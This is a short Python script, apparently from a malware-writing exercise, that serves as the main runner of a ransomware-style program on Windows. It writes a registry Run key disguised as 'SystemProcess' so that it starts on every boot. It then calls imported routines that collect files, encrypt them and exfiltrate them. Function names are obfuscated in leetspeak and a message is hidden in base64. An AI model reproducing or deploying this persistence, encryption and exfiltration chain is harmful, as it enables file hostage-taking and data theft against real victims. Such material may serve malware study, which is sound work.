import base64
import os
import sys
import winreg  # Windows-only
from file_collecter import collect_files as cF
from Task_2 import run_encryption as rE
from Task_3 import run_exfiltration as rX

# Decode base64 string
def d3c0de(encoded):
    return base64.b64decode(encoded).decode()

# Persistence: Add registry key to run script on startup
def p3rsist():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
        path = os.path.abspath(sys.argv[0])
        winreg.SetValueEx(key, "SystemProcess", 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
        print("Persistence added to registry.")
    except Exception as e:
        print(f"Failed to set persistence: {e}")

# Base64 string for an obfuscated message
bmsg = b'U3RlcCAxOiBHZXR0aW5nIHJlYWR5IHRvIHJ1bg=='  # "Step 1: Getting ready to run"

# Main runner
def m41n():
    print(d3c0de(bmsg))
    p3rsist()
    f1l3z = cF()     #Collect files
    rE(f1l3z)        # Encrypt
    rX()             # Exfiltrate

if __name__ == "__main__":
    m41n()

